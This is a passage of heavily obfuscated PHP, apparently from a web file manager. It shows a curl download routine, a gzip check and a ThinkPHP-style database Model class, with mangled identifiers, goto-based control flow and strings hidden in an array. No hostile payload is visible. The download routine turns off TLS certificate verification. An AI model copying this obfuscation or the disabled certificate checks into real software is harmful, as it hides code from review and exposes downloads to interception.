æ›Õ); return array($B¦­öÕ‘ [1030] => !1, $B¦­öÕ‘ [1032] => $B¦­öÕ‘ [1523]); } clearstatcache(); if ($C±Š‹ £ô¬ > 0 && $C±Š‹ £ô¬ == filesize(iconv_system($c¨Ì»¡®¯))) { break; } fwrite($dõ¥¾ æ›Õ, fread($AÈÔŞÀ˜, 1024 * 8), 1024 * 8); } fclose($dõ¥¾ æ›Õ); goto eÌœÈ§¼ñ™; b›íÑË‹…Ë: } else { return array($B¦­öÕ‘ [1030] => !1, $B¦­öÕ‘ [1032] => $B¦­öÕ‘ [1525]); } } static function fileDownloadCurl($EØ›—²æš£, $AÔ”Ë˜¼ÖË, $cÅœ‡‘‘³¶ = false, $f”Â ÎĞ‚” = 0, $c„ïÛ˜¯µ = 0) { goto dº­Ç±¬à; DÄöÒ¼ˆŒö: curl_setopt($c°Ï™è’™×, CURLOPT_NOPROGRESS, !1); curl_setopt($c°Ï™è’™×, CURLOPT_PROGRESSFUNCTION, $FÊìšíÛ»´[1527]); curl_progress_start($c°Ï™è’™×); goto CÑæÎ™¨ö„; eÃ¦¬ÎêÇ™: curl_close($c°Ï™è’™×); fclose($DÌ§ÙÔ¸ùÛ); $f¤Ğ¥İİ = filesize(iconv_system($Aˆ¢İÃÙŒ©)); goto fí„åÔĞ; fí„åÔĞ: if ($f¤Ğ¥İİ < $c„ïÛ˜¯µ && $c„ïÛ˜¯µ != 0) { return array($FÊìšíÛ»´[1030] => !1, $FÊìšíÛ»´[1032] => $FÊìšíÛ»´[1516]); } if ($bÓŞ®×ù³Ú && filesize($Aˆ¢İÃÙŒ©) != 0) { self::checkGzip($Aˆ¢İÃÙŒ©); if (!@rename($Aˆ¢İÃÙŒ©, $AÔ”Ë˜¼ÖË)) { @unlink($AÔ”Ë˜¼ÖË); $bÓŞ®×ù³Ú = @rename($Aˆ¢İÃÙŒ©, $AÔ”Ë˜¼ÖË); if (!$bÓŞ®×ù³Ú) { return array($FÊìšíÛ»´[1030] => !1, $FÊìšíÛ»´[1032] => $FÊìšíÛ»´[1528]); } } return array($FÊìšíÛ»´[1030] => !0, $FÊìšíÛ»´[1032] => $FÊìšíÛ»´[699]); } return array($FÊìšíÛ»´[1030] => !1, $FÊìšíÛ»´[1032] => $FÊìšíÛ»´[1529]); goto AŸŠ­—¤·§; DŠ¢£æî‡÷: curl_setopt($c°Ï™è’™×, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($c°Ï™è’™×, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($c°Ï™è’™×, CURLOPT_SSL_VERIFYHOST, 0); goto DÄöÒ¼ˆŒö; CÑæÎ™¨ö„: curl_setopt($c°Ï™è’™×, CURLOPT_USERAGENT, $FÊìšíÛ»´[1519]); $bÓŞ®×ù³Ú = curl_exec($c°Ï™è’™×); curl_progress_end($c°Ï™è’™×); goto eÃ¦¬ÎêÇ™; dº­Ç±¬à: $FÊìšíÛ»´ =& $_SERVER[Å¸ş]; $Aˆ¢İÃÙŒ© = $AÔ”Ë˜¼ÖË . $FÊìšíÛ»´[1515]; set_timeout(); goto e©«±Õ½¹; E„×œÄÍ‹³: if ($cÅœ‡‘‘³¶) { curl_setopt($c°Ï™è’™×, CURLOPT_RANGE, $f”Â ÎĞ‚” . $FÊìšíÛ»´[718]); } curl_setopt($c°Ï™è’™×, CURLOPT_FILE, $DÌ§ÙÔ¸ùÛ); curl_setopt($c°Ï™è’™×, CURLOPT_REFERER, get_url_link($EØ›—²æš£)); goto DŠ¢£æî‡÷; e©«±Õ½¹: $DÌ§ÙÔ¸ùÛ = @fopen($Aˆ¢İÃÙŒ©, $FÊìšíÛ»´[978]); if (!$DÌ§ÙÔ¸ùÛ) { return array($FÊìšíÛ»´[1030] => !1, $FÊìšíÛ»´[1032] => $FÊìšíÛ»´[1526]); } $c°Ï™è’™× = curl_init($EØ›—²æš£); goto E„×œÄÍ‹³; AŸŠ­—¤·§: } static function checkGzip($cñÓ’‚«‰ñ) { goto eÕ¾ËÓ÷‚‡; eÕ¾ËÓ÷‚‡: $FßÔš´ùÕ† = $_SERVER[Å¸ş][1530]; $CöÏ…Ò•  = file_sub_str($cñÓ’‚«‰ñ, 0, 2); if ($FßÔš´ùÕ† != $CöÏ…Ò• ) { return; } goto Eº‡†É²¨Ô; Eº‡†É²¨Ô: ob_start(); readgzfile($cñÓ’‚«‰ñ); $bååÒ»¼é = ob_get_clean(); goto eÈø“¾¾Üµ; eÈø“¾¾Üµ: file_put_contents($cñÓ’‚«‰ñ, $bååÒ»¼é); goto Aò¬ªí›ÎÄ; Aò¬ªí›ÎÄ: } } goto F…÷Ææ¸‚; c³‰¸òÑâô: define($_SERVER[Å¸ş][230], 0); define($_SERVER[Å¸ş][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\x64\145\x72", "\x61\154\151\x61\x73", "\150\141\x76\151\156\147", "\x67\x72\157\165\160", "\x6c\157\143\x6b", "\x64\x69\x73\164\x69\156\143\x74", "\x61\165\164\157", "\x66\x69\x6c\164\x65\x72", "\x76\x61\x6c\151\x64\x61\164\x65", "\162\x65\163\x75\154\x74", "\142\151\156\144", "\164\x6f\153\145\156"); public function __construct($DùĞâËÂŞÓ = '', $c¯á±öñÛ¿ = '', $BÚ‘¹Ù…ğµ = '') { $a„¹ÊŞôÎ =& $_SERVER[Å¸ş]; $this->_initialize(); if (!empty($DùĞâËÂŞÓ)) { if (strpos($DùĞâËÂŞÓ, $a„¹ÊŞôÎ[91])) { list($this->dbName, $this->name) = explode($a„¹ÊŞôÎ[91], $DùĞâËÂŞÓ); } else { $this->name = $DùĞâËÂŞÓ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c¯á±öñÛ¿)) { $this->tablePrefix = $a„¹ÊŞôÎ[33]; } elseif ($a„¹ÊŞôÎ[33] != $c¯á±öñÛ¿) { $this->tablePrefix = $c¯á±öñÛ¿; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($a„¹ÊŞôÎ[232]); } $this->db(0, empty($this->connection) ? $BÚ‘¹Ù…ğµ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $CÈ‹ÏÈ¸ÌÆ =& $_SERVER[Å¸ş]; if (empty($this->fields)) { if (think_config($CÈ‹ÏÈ¸ÌÆ[233])) { $FÒßŞà‚­‹ = $this->dbName ? $this->dbName : think_config($CÈ‹ÏÈ¸ÌÆ[234]); $D·ÄŸôéÓ¯ = think_var_cache($CÈ‹ÏÈ¸ÌÆ[235] . strtolower(get_path_this($FÒßŞà‚­‹) . $CÈ‹ÏÈ¸ÌÆ[91] . $this->name)); if ($D·ÄŸôéÓ¯) { $B–ôÃõÄÆ¸ = think_config($CÈ‹ÏÈ¸ÌÆ[236]); if (empty($B–ôÃõÄÆ¸) || $D·ÄŸôéÓ¯[$CÈ‹ÏÈ¸ÌÆ[237]] == $B–ôÃõÄÆ¸) { $this->fields = $D·ÄŸôéÓ¯; return; } } } $this->flush(); } } public function flush() { goto fÓ™†í¼Ø”; Eï¿Œ—ä£ñ: foreach ($d…ùõÌ›ÊŠ as $FØ·¦‘ÀÚ => $EÁÆ¹“î­â) { $cÅê÷ïŠÅ[$FØ·¦‘ÀÚ] = $EÁÆ¹“î­â[$Cß¼ğÓ·Œ³[29]]; if ($EÁÆ¹“î­â[$Cß¼ğÓ·Œ³[36]]) { $this->fields[$Cß¼ğÓ·Œ³[239]] = $FØ·¦‘ÀÚ; if ($EÁÆ¹“î­â[$Cß¼ğÓ·Œ³[39]]) { $this->fields[$Cß¼ğÓ·Œ³[238]] = !0; } } } $this->fields[$Cß¼ğÓ·Œ³[240]] = $cÅê÷ïŠÅ; if (think_config($Cß¼ğÓ·Œ³[236])) { $this->fields[$Cß¼ğÓ·Œ³[237]] = think_config($Cß¼ğÓ·Œ³[236]); } goto bÅÃÏ‘ÃÒˆ; bÅÃÏ‘ÃÒˆ: if (think_config($Cß¼ğÓ·Œ³[233])) { $fÂ…çÁÍÂ“ = $this->dbName ? $this->dbName : think_config($Cß¼ğÓ·Œ³[234]); think_var_cache($Cß¼ğÓ·Œ³[235] . strtolower(get_path_this($fÂ…çÁÍÂ“) . $Cß¼ğÓ·Œ³[91] . $this->name), $this->fields); } goto Fëê×Õ; EãïÓ‹É¼: if (!$d…ùõÌ›ÊŠ) { return !1; } $this->fields = array_keys($d…ùõÌ›ÊŠ); $this->fields[$Cß¼ğÓ·Œ³[238]] = !1; goto Eï¿Œ—ä£ñ; fÓ™†í¼Ø”: $Cß¼ğÓ·Œ³ =& $_SERVER[Å¸ş]; $this->db->setModel($this->name); $d…ùõÌ›ÊŠ = $this->db->getFields($this->getTableName()); goto EãïÓ‹É¼; Fëê×Õ: } public function switchModel($c­Ê¸›´Ò, $E‹‚Í«ŸÅ = array()) { $dƒÊŞæ« =& $_SERVER[Å¸ş]; $e„ÎòçÒÍ = ucwords(strtolower($c­Ê¸›´Ò)) . $dƒÊŞæ«[241]; if (!class_exists($e„ÎòçÒÍ)) { think_exception($e„ÎòçÒÍ . think_lang($dƒÊŞæ«[242])); } $this->_extModel = new $e„ÎòçÒÍ($this->name); if (!empty($E‹‚Í«ŸÅ)) { foreach ($E‹‚Í«ŸÅ as $A·´òô) { $this->_extModel->setProperty($A·´òô, $this->{$A·´òô}); } } return $this->_extModel; } public function __set($Dƒ”™Ê‘›, $a´©¥•Ó») { $this->data[$Dƒ”™Ê‘›] = $a´©¥•Ó»; } public function __get($D²—ë›×ø) { return isset($this->data[$D²—ë›×ø]) ? $this->data[$D²—ë›×ø] : null; } public function __isset($a²·½Šé¯ò) { return isset($this->data[$a²·½Šé¯ò]); } public function __unset($B¬‹–Ç½ßÌ) { unset($this->data[$B¬‹–Ç½ßÌ]); } public function __call($B¤‹Š¿«ê‹, $AßØÅºÜÔÔ) { $fçÒŒª¯Œ =& $_SERVER[Å¸ş]; if (in_array(strtolower($B¤‹Š¿«ê‹), $this->methods, !0)) { $this->options[strtolower($B¤‹Š¿«ê‹)] = $AßØÅºÜÔÔ[0]; return $this; } elseif (in_array(strtolower($B¤‹Š¿«ê‹), array($fçÒŒª¯Œ[243], $fçÒŒª¯Œ[244], $fçÒŒª¯Œ[245], $fçÒŒª¯Œ[246], $fçÒŒª¯Œ[247]), !0)) { $DĞ·¡¹‚¶ = isset($AßØÅºÜÔÔ[0]) ? $AßØÅºÜÔÔ[0] : $fçÒŒª¯Œ[176]; $DĞ·¡¹‚¶ = $this->db->parseKey($DĞ·¡¹‚¶); return $this->getField(strtoupper($B¤‹Š¿«ê‹) . $fçÒŒª¯Œ[248] . $DĞ·¡¹‚¶ . $fçÒŒª¯Œ[249] . $B¤‹Š¿«ê‹, $fçÒŒª¯Œ[243]); } elseif (strtolower(substr($B¤‹Š¿«ê‹, 0, 5)) == $fçÒŒª¯Œ[250]) { $DĞ·¡¹‚¶ = think_parse_name(substr($B¤‹Š¿«ê‹, 5)); $A™¹õ¿°½¼[$DĞ·¡¹‚¶] = $AßØÅºÜÔÔ[0]; return $this->where($A™¹õ¿°½¼)->find(); } elseif (strtolower(substr($B¤‹Š¿«ê‹, 0, 10)) == $fçÒŒª¯Œ[251]) { $f•ë±ÈìÏç = think_parse_name(substr($B¤‹Š¿«ê‹, 10)); $A™¹õ¿°½¼[$f•ë±ÈìÏç] = $AßØÅºÜÔÔ[0]; return $this->where($A™¹õ¿°½¼)->getField($AßØÅºÜÔÔ[1]); } elseif (isset($this->_scope[$B¤‹Š¿«ê‹])) { return $this->scope($B¤‹Š¿«ê‹, $AßØÅºÜÔÔ[0]); } elseif (method_exists($this, $B¤‹Š¿«ê‹)) { array_unshift($AßØÅºÜÔÔ, $B¤‹Š¿«ê‹); return call_user_func_array(array($this, $fçÒŒª¯Œ[252]), $AßØÅºÜÔÔ); } else { return call_user_func_array(array(parent, $B¤‹Š¿«ê‹), $AßØÅºÜÔÔ); } } protected function call() { goto c¤˜˜ì½‚; B‡•Êàí´ª: $Eà¬‘¼Ğù½ = $eç½ÍéÌÓÀ; if (is_array($eç½ÍéÌÓÀ)) { $Eà¬‘¼Ğù½ = $eç½ÍéÌÓÀ[1]; $eç½ÍéÌÓÀ = $eç½ÍéÌÓÀ[0]; } $EáÕ©”æ™Ê = count($fî’ÇÛ®­») - 1; goto D¤‹±ãéµŠ; DØç••ÆÒ¶: $F“ä„‘™“Ô = call_user_func_array(array($this, $eç½ÍéÌÓÀ), $fî’ÇÛ®­»); if (method_exists($this, $A‰¿èµß¡[256])) { $då²îÛŠ—İ = call_user_func_array(array($this, $A‰¿èµß¡[257]), array($Eà¬‘¼Ğù½, $fî’ÇÛ®­», $F“ä„‘™“Ô)); if ($då²îÛŠ—İ) { return $då²îÛŠ—İ; } } return $F“ä„‘™“Ô; goto Cé­¢Æ°³Ø; D¤‹±ãéµŠ: if (isset($fî’ÇÛ®­»[$EáÕ©”æ™Ê]) && $fî’ÇÛ®­»[$EáÕ©”æ™Ê] === $eç½ÍéÌÓÀ) { think_exception(__CLASS__ . $A‰¿èµß¡[4] . $eç½ÍéÌÓÀ . think_lang($A‰¿èµß¡[253])); return; } $fî’ÇÛ®­»[] = $eç½ÍéÌÓÀ; if (method_exists($this, $A‰¿èµß¡[254])) { $då²îÛŠ—İ = call_user_func_array(array($this, $A‰¿èµß¡[255]), array($Eà¬‘¼Ğù½, $fî’ÇÛ®­»)); if (!is_null($då²îÛŠ—İ) && $då²îÛŠ—İ !== !1) { return $då²îÛŠ—İ; } } goto DØç••ÆÒ¶; c¤˜˜ì½‚: $A‰¿èµß¡ =& $_SERVER[Å¸ş]; $fî’ÇÛ®­» = func_get_args(); $eç½ÍéÌÓÀ = array_shift($fî’ÇÛ®­»); goto B‡•Êàí´ª; Cé­¢Æ°³Ø: } protected function _initialize() { } protected function _facade($bç¡š„™Ù¤) { $C‹³Œ®ËŒ =& $_SERVER[Å¸ş]; if (!empty($this->fields)) { foreach ($bç¡š„™Ù¤ as $d‰ø‹¦¹£ => $c•ôÑòõ¬¸) { if (!in_array($d‰ø‹¦¹£, $this->fields, !0)) { unset($bç¡š„™Ù¤[$d‰ø‹¦¹£]); } elseif (is_scalar($c•ôÑòõ¬¸)) { $this->_parseType($bç¡š„™Ù¤, $d‰ø‹¦¹£); } } } if (!empty($this->options[$C‹³Œ®ËŒ[258]])) { $bç¡š„™Ù¤ = array_map($this->options[$C‹³Œ®ËŒ[258]], $bç¡š„™Ù¤); unset($this->options[$C‹³Œ®ËŒ[258]]); } $this->_beforeWrite($bç¡š„™Ù¤); return $bç¡š„™Ù¤; } protected function _beforeWrite(&$f·åÁ¡Ğ) { } public function add($C¤ŒÚÅÍ = '', $cË’²ÂŒ÷Ê = array(), $b½®Ë·Ëã… = false) { goto bÛÎàæÈ¼Ö; fÙì×ôƒ ­: return $e°’ÊÃÉù; goto B…•¥°÷›; bÛÎàæÈ¼Ö: if (empty($C¤ŒÚÅÍ)) { if (!empty($this->data)) { $C¤ŒÚÅÍ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Å¸ş][259]); return !1; } } $cË’²ÂŒ÷Ê = $this->_parseOptions($cË’²ÂŒ÷Ê); $C¤ŒÚÅÍ = $this->_facade($C¤ŒÚÅÍ); goto EŞ‡·¥ÎŸ”; EŞ‡·¥ÎŸ”: if (!1 === $this->_beforeInsert($C¤ŒÚÅÍ, $cË’²ÂŒ÷Ê)) { return !1; } $e°’ÊÃÉù = $this->db->insert($C¤ŒÚÅÍ, $cË’²ÂŒ÷Ê, $b½®Ë·Ëã…); if (!1 !== $e°’ÊÃÉù) { $Dªñ®½îÍ = $this->getLastInsID(); if ($Dªñ®½îÍ) { $C¤ŒÚÅÍ[$this->getPk()] = $Dªñ®½îÍ; $this->_after_insert($C¤ŒÚÅÍ, $cË’²ÂŒ÷Ê); return $Dªñ®½îÍ; } $this->_after_insert($C¤ŒÚÅÍ, $cË’²ÂŒ÷Ê); } goto fÙì×ôƒ ­; B…•¥°÷›: } protected function _beforeInsert(&$BŠ˜ÂÈÁ®õ, $B†£¬á÷Òà) { } protected function _after_insert($d‰„ö‰‘×ò, $C¹¦¯¾®âÓ) { } public function addAll($dñ˜°Õè, $CÌ…®ÉÊ‘é = array(), $DÒŞ·©ŒìÁ = false) { goto Fº¿§˜²Ë; aÖè¹÷ò ¡: foreach ($dñ˜°Õè as $bã¢…©Çù… => $B•áÓ¤ö²©) { $dñ˜°Õè[$bã¢…©Çù…] = $this->_facade($B•áÓ¤ö²©); } if (method_exists($this->db, $fáÂºª„é[260])) { $dó ƒ¢Õ¼‡ = $this->db->insertAll($dñ˜°Õè, $CÌ…®ÉÊ‘é, $DÒŞ·©ŒìÁ); } else { $this->startTrans(); foreach ($dñ˜°Õè as $bã¢…©Çù… => $B•áÓ¤ö²©) { $dó ƒ¢Õ¼‡ = $this->db->insert($B•áÓ¤ö²©, $CÌ…®ÉÊ‘é, $DÒŞ·©ŒìÁ); } $this->commit(); } if (!1 !== $dó ƒ¢Õ¼‡) { $eÄ¯İºŞìô = $this->getLastInsID(); if ($eÄ¯İºŞìô) { return $eÄ¯İºŞìô; } } goto C©§³…êÜÜ; C©§³…êÜÜ: return $dó ƒ¢Õ¼‡; goto e×…ƒçÉˆ; Fº¿§˜²Ë: $fáÂºª„é =& $_SERVER[Å¸ş]; if (empty($dñ˜°Õè)) { $this->error = think_lang($fáÂºª„é[259]); return !1; } $CÌ…®ÉÊ‘é = $this->_parseOptions($CÌ…®ÉÊ‘é); goto aÖè¹÷ò ¡; e×…ƒçÉˆ: } public function selectAdd($B“ÕïğØ©ó = '', $c×Ãñ®Õè™ = '', $cˆÊ¥õ®Š¬ = array()) { $e–¶ãƒÒÀ =& $_SERVER[Å¸ş]; $cˆÊ¥õ®Š¬ = $this->_parseOptions($cˆÊ¥õ®Š¬); if (!1 === ($e‘¨î¼«Ù§ = $this->db->selectInsert($B“ÕïğØ©ó ? $B“ÕïğØ©ó : $cˆÊ¥õ®Š¬[$e–¶ãƒÒÀ[261]], $c×Ãñ®Õè™ ? $c×Ãñ®Õè™ : $this->getTableName(), $cˆÊ¥õ®Š¬))) { $this->error = think_lang($e–¶ãƒÒÀ[262]); return !1; } else { return $e‘¨î¼«Ù§; } } public function save($F±ŠïÓ‘£° = '', $câê½ùÌ×• = array()) { goto Aí¢²’êîÍ; bÇ–¢…¡Ôò: if (!1 !== $C²Ä‹´ğƒï) { if (isset($b­ÀÜÄºë)) { $F±ŠïÓ‘£°[$EŞÉøÚ‰Ø] = $b­ÀÜÄºë; } $this->_afterUpdate($F±ŠïÓ‘£°, $câê½ùÌ×•); } return $C²Ä‹´ğƒï; goto bæ¸”ÔÌæ; F†İçÆƒÍ³: if (is_array($câê½ùÌ×•[$bìœìÑ¶¦É[263]]) && isset($câê½ùÌ×•[$bìœìÑ¶¦É[263]][$EŞÉøÚ‰Ø])) { $b­ÀÜÄºë = $câê½ùÌ×•[$bìœìÑ¶¦É[263]][$EŞÉøÚ‰Ø]; } if (!1 === $this->_beforeUpdate($F±ŠïÓ‘£°, $câê½ùÌ×•)) { return !1; } $C²Ä‹´ğƒï = $this->db->update($F±ŠïÓ‘£°, $câê½ùÌ×•); goto bÇ–¢…¡Ôò; Aí¢²’êîÍ: $bìœìÑ¶¦É =& $_SERVER[Å¸ş]; if (empty($F±ŠïÓ‘£°)) { if (!empty($this->data)) { $F±ŠïÓ‘£° = $this->data; $this->data = array(); } else { $this->error = think_lang($bìœìÑ¶¦É[259]); return !1; } } $F±ŠïÓ‘£° = $this->_facade($F±ŠïÓ‘£°); goto b¦‘Æğô††; b¦‘Æğô††: $câê½ùÌ×• = $this->_parseOptions($câê½ùÌ×•); $EŞÉøÚ‰Ø = $this->getPk(); if (!isset($câê½ùÌ×•[$bìœìÑ¶¦É[263]])) { if (isset($F±ŠïÓ‘£°[$EŞÉøÚ‰Ø])) { $bÅÆÊ´ÛÜ±[$EŞÉøÚ‰Ø] = $F±ŠïÓ‘£°[$EŞÉøÚ‰Ø]; $câê½ùÌ×•[$bìœìÑ¶¦É[263]] = $bÅÆÊ´ÛÜ±; unset($F±ŠïÓ‘£°[$EŞÉøÚ‰Ø]); } else { $this->error = think_lang($bìœìÑ¶¦É[262]); return !1; } } goto F†İçÆƒÍ³; bæ¸”ÔÌæ: } protected function _beforeUpdate(&$eğ†‘‹–Ù, $dá¹¹ÖÚƒé) { } protected function _afterUpdate($AŠ˜ø«Œ, $fä›®¹èöÜ) { } public function delete($Fä§¿ĞÇÉ = array()) { goto FùÀ¿ÜÎ; FùÀ¿ÜÎ: $f„Ÿ”÷›’ =& $_SERVER[Å¸ş]; if (empty($Fä§¿ĞÇÉ) && empty($this->options[$f„Ÿ”÷›’[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $cğÆ­¡‹Õ‡ = $this->getPk(); goto EÄ”Áõ©Ú—; EÄ”Áõ©Ú—: if (is_numeric($Fä§¿ĞÇÉ) || is_string($Fä§¿ĞÇÉ)) { if (strpos($Fä§¿ĞÇÉ, $f„Ÿ”÷›’[47])) { $FƒÆ„…Ã±[$cğÆ­¡‹Õ‡] = array($f„Ÿ”÷›’[264], $Fä§¿ĞÇÉ); } else { $FƒÆ„…Ã±[$cğÆ­¡‹Õ‡] = $Fä§¿ĞÇÉ; } $this->options[$f„Ÿ”÷›’[263]] = $FƒÆ„…Ã±; } $Fä§¿ĞÇÉ = $this->_parseOptions(); if (is_array($Fä§¿ĞÇÉ[$f„Ÿ”÷›’[263]]) && isset($Fä§¿ĞÇÉ[$f„Ÿ”÷›’[263]][$cğÆ­¡‹Õ‡])) { $A†¦Šõ°•ö = $Fä§¿ĞÇÉ[$f„Ÿ”÷›’[263]][$cğÆ­¡‹Õ‡]; } goto fßö¹Òß; fßö¹Òß: $a‹±‰Ò—çŸ = $this->db->delete($Fä§¿ĞÇÉ); if (!1 !== $a‹±‰Ò—çŸ) { $fÌàìš­¹Ş = array(); if (isset($A†¦Šõ°•ö)) { $fÌàìš­¹Ş[$cğÆ­¡‹Õ‡] = $A†¦Šõ°•ö; } $this->_after_delete($fÌàìš­¹Ş, $Fä§¿ĞÇÉ); } return $a‹±‰Ò—çŸ; goto c±’À£ğµ¿; c±’À£ğµ¿: } protected function _after_delete($Dç àäëÅ, $cíÀï¬ ¨á) { } public function select($cìã†¾ìòÕ = array()) { goto B¬ùôõÀ¨÷; b×ÁŒ Õ™: $còÉª¶¡¿ = $this->db->select($cìã†¾ìòÕ); if (!1 === $còÉª¶¡¿) { return !1; } if (empty($còÉª¶¡¿)) { return null; } goto D¦±‚íä†‹; B¬ùôõÀ¨÷: $Aø‰ÈÖê¦ =& $_SERVER[Å¸ş]; if (is_string($cìã†¾ìòÕ) || is_numeric($cìã†¾ìòÕ)) { $f î²³ÄÇÁ = $this->getPk(); if (strpos($cìã†¾ìòÕ, $Aø‰ÈÖê¦[47])) { $d¿ÛòØ”«[$f î²³ÄÇÁ] = array($Aø‰ÈÖê¦[264], $cìã†¾ìòÕ); } else { $d¿ÛòØ”«[$f î²³ÄÇÁ] = $cìã†¾ìòÕ; } $this->options[$Aø‰ÈÖê¦[263]] = $d¿ÛòØ”«; } elseif (!1 === $cìã†¾ìòÕ) { $cìã†¾ìòÕ = $this->_parseOptions(); return $Aø‰ÈÖê¦[265] . $this->db->buildSelectSql($cìã†¾ìòÕ) . $Aø‰ÈÖê¦[266]; } $cìã†¾ìòÕ = $this->_parseOptions(); goto b×ÁŒ Õ™; D¦±‚íä†‹: $this->_afterSelect($còÉª¶¡¿, $cìã†¾ìòÕ); return $còÉª¶¡¿; goto Ašß‚ƒÉê; Ašß‚ƒÉê: } protected function _afterSelect(&$FÌêÄè¹à», $a®Ğİ×…›Ô) { } public function buildSql($d‡ŠÄíÏ¼ã = array()) { $e‡Ïòí‚î =& $_SERVER[Å¸ş]; $d‡ŠÄíÏ¼ã = $this->_parseOptions($d‡ŠÄíÏ¼ã); return $e‡Ïòí‚î[265] . $this->db->buildSelectSql($d‡ŠÄíÏ¼ã) . $e‡Ïòí‚î[266]; } public function optionsValue($bâïÇÄøÈö = null) { if (is_null($bâïÇÄøÈö)) { return $this->options; } elseif (is_array($bâïÇÄøÈö)) { $this->options = array_merge($this->options, $bâïÇÄøÈö); } } protected function _parseOptions($e—øé¼§Ìä = array()) { goto Bà–õùãÃ; Aª·ŒÑåéÄ: if (!isset($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[267]])) { $e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[267]] = $this->getTableName(); $b±µ†«¥Ù¾ = $this->fields; } else { $b±µ†«¥Ù¾ = $this->getDbFields(); } if (!empty($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[268]])) { $e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[267]] .= $B‰•ŠÂ„ˆ¥[50] . $e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[268]]; } $e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[269]] = $this->name; goto Bç¦Áëğ Ò; Bç¦Áëğ Ò: if (isset($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[263]]) && is_array($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[263]]) && !empty($b±µ†«¥Ù¾) && !isset($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[270]]) && !isset($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[267]])) { foreach ($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[263]] as $eŒĞà§¡Ãº => $A¡‚¨Èòó) { $eŒĞà§¡Ãº = trim($eŒĞà§¡Ãº); if (in_array($eŒĞà§¡Ãº, $b±µ†«¥Ù¾, !0)) { if (is_scalar($A¡‚¨Èòó)) { $this->_parseType($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[263]], $eŒĞà§¡Ãº); } } elseif (!is_numeric($eŒĞà§¡Ãº) && $B‰•ŠÂ„ˆ¥[70] != substr($eŒĞà§¡Ãº, 0, 1) && !1 === strpos($eŒĞà§¡Ãº, $B‰•ŠÂ„ˆ¥[91]) && !1 === strpos($eŒĞà§¡Ãº, $B‰•ŠÂ„ˆ¥[248]) && !1 === strpos($eŒĞà§¡Ãº, $B‰•ŠÂ„ˆ¥[271]) && !1 === strpos($eŒĞà§¡Ãº, $B‰•ŠÂ„ˆ¥[272])) { unset($e—øé¼§Ìä[$B‰•ŠÂ„ˆ¥[263]][$eŒĞà§¡Ãº]); } } } $this->_options_filter($e—øé¼§Ìä); return $e—øé¼§Ìä; goto B§„–î²Ã; Bà–õùãÃ: $B‰•ŠÂ„ˆ¥ =& $_SERVER[Å¸ş]; if (is_array($e—øé¼§Ìä)) { $e—øé¼§Ìä = array_merge($this->options, $e—øé¼§Ìä); } $this->options = array(); goto Aª·ŒÑåéÄ; B§„–î²Ã: } protected function _options_filter(&$EÄİÇôºè„) { } protected function _parseType(&$EÖ×•²Ğø», $b÷İº×ÙãÍ) { $BÃ²îç’Œ =& $_SERVER[Å¸ş]; if (empty($this->options[$BÃ²îç’Œ[273]][$BÃ²îç’Œ[4] . $b÷İº×ÙãÍ])) { $CŸ»‡åÉÅ× = strtolower($this->fields[$BÃ²îç’Œ[240]][$b÷İº×ÙãÍ]); if (!1 !== strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[274])) { } elseif (!1 === strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[275]) && !1 !== strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[276])) { $EÖ×•²Ğø»[$b÷İº×ÙãÍ] = intval($EÖ×•²Ğø»[$b÷İº×ÙãÍ]); } elseif (!1 !== strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[277]) || !1 !== strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[278])) { $EÖ×•²Ğø»[$b÷İº×ÙãÍ] = floatval($EÖ×•²Ğø»[$b÷İº×ÙãÍ]); } elseif (!1 !== strpos($CŸ»‡åÉÅ×, $BÃ²îç’Œ[279])) { $EÖ×•²Ğø»[$b÷İº×ÙãÍ] = (bool) $EÖ×•²Ğø»[$b÷İº×ÙãÍ]; } } } public function find($eœ•–ƒê¢‡ = array()) { goto D†Æëç„Šë; bòÙ‚ïŸÅ”: $eœ•–ƒê¢‡ = $this->_parseOptions(); $cêåŸåíïË = $this->db->select($eœ•–ƒê¢‡); if (!1 === $cêåŸåíïË) { return !1; } goto A¶£ÔÆèŸ“; A¶£ÔÆèŸ“: if (empty($cêåŸåíïË)) { return null; } $this->data = $cêåŸåíïË[0]; $this->_afterFind($this->data, $eœ•–ƒê¢‡); goto Aùæ•‡ŠØ¡; Aùæ•‡ŠØ¡: if (!empty($this->options[$c¤ğ¾‚©„[281]])) { return $this->returnResult($this->data, $this->options[$c¤ğ¾‚©„[281]]); } return $this->data; goto f­¨¸¾Íæ; D†Æëç„Šë: $c¤ğ¾‚©„ =& $_SERVER[Å¸ş]; if (is_numeric($eœ•–ƒê¢‡) || is_string($eœ•–ƒê¢‡)) { $CÙ—êÎŒİ[$this->getPk()] = intval($eœ•–ƒê¢‡); $this->options[$c¤ğ¾‚©„[263]] = $CÙ—êÎŒİ; } $this->options[$c¤ğ¾‚©„[280]] = 